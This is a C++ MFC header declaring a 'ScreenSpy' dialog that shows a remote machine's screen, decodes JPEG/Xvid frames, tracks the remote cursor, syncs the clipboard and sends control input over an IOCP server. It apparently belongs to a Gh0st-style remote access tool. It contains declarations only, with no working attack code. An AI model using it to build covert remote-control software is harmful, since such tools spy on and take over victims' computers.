

#include "CursorInfo.h"

#include "../common/jpegsdk/jpeglib.h"
#include "../common/xvidsdk/XvidDec.h"
#include "MainFrm.h"

#ifdef _DEBUG
#pragma comment(lib, "../common/jpegsdk/turbojpegd.lib")
#else
#pragma comment(lib, "../common/jpegsdk/turbojpeg.lib")
#endif // _DEBUG

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// ScreenSpyDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CScreenSpyDlgSmall dialog


class CScreenSpyDlgSmall : public CDialog
{
// Construction
public:
	void OnReceiveComplete();
	void OnReceive();
	CScreenSpyDlgSmall(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
// Dialog Data
	//{{AFX_DATA(CScreenSpyDlgSmall)
	enum { IDD = IDD_SCREENSPY_SMALL };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CScreenSpyDlgSmall)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CScreenSpyDlgSmall)
	virtual BOOL OnInitDialog();
	afx_msg void OnNcLButtonDblClk(UINT nHitTest, CPoint point);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg LRESULT OnSizing(WPARAM wParam, LPARAM lParam);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnGetMinMaxInfo(MINMAXINFO* lpMMI);
	afx_msg LRESULT OnMoving(WPARAM wParam, LPARAM lParam);
	afx_msg void OnMove(int x, int y);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	HICON	m_hIcon;
	RECT	m_rcRestore;
	BOOL	m_bWinArrange;
	BOOL	m_bSnapSizing;
	HDC		m_hCurrWndDC;
	HDC		m_hLastMemDC;
	HBITMAP	m_hLastBitmap;
	LPVOID	m_lpvLastBits;
	LPVOID	m_lpvRectBits;
	LPBITMAPINFO m_lpbmi_full;
	LPBITMAPINFO m_lpbmi_rect;
	CRITICAL_SECTION m_cs;
	CXvidDec m_XvidDec;
	HANDLE	m_hThreadFPS;
	UINT	m_nFramesCount;
	UINT	m_nFramesPerSecond;
	HCURSOR	m_hRemoteCursor;
	POINT	m_LastCursorPos;
	BYTE	m_LastCursorIndex;
	CCursorInfo	m_CursorInfo;
	void DrawTipString(CString str);
	void DrawFirstScreen();
	void DrawNextScreenHome();	// 家用办公算法
	bool JPG_BMP(int cbit, void *input, int inlen, void *output);
	void DrawNextScreenXvid();	// 影视娱乐算法
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
	void FullScreen();
	void ResetScreen();
	bool SaveSnapshot();
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	bool m_bIsFirst;
	bool m_bIsFullScreen;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	CMainFrame* m_pParent;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);
	static DWORD WINAPI ShowFPSThread(LPVOID lpParam);
public:///自适应
	UINT	m_nWidth;
     	UINT	m_nHeight;
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.


